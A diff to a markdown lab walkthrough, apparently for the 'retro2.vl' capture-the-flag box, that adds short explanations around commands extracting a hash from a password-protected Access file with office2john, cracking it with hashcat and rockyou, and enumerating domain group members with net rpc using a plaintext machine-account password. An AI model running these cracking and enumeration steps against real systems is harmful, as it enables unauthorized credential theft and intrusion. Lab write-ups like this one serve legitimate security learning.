@@ -265,10 +265,12 @@ Im going to revisit the file i found at the start and see if i can find credenti
 
 # Access over RDP
 After transferring the file to my windows machine i can see its password protected so ill crack it in kali
+
 ```python
 office2john staff.accdb | tee accdb.hash  
 staff.accdb:$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf77d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235
 ```
+This generated a hash for me to crack
 
 ```python
 hashcat accdb.hash /usr/share/wordlists/rockyou.txt --user
@@ -358,8 +360,9 @@ net rpc group members "services" -U "retro2.vl"/"admws01$"%'dmuhackers123!' -S "
 RETRO2\ADMWS01$
 RETRO2\inventory
 RETRO2\ldapreader
-
-
 ```
+So now i should be able to RDP 
+
+
 
 
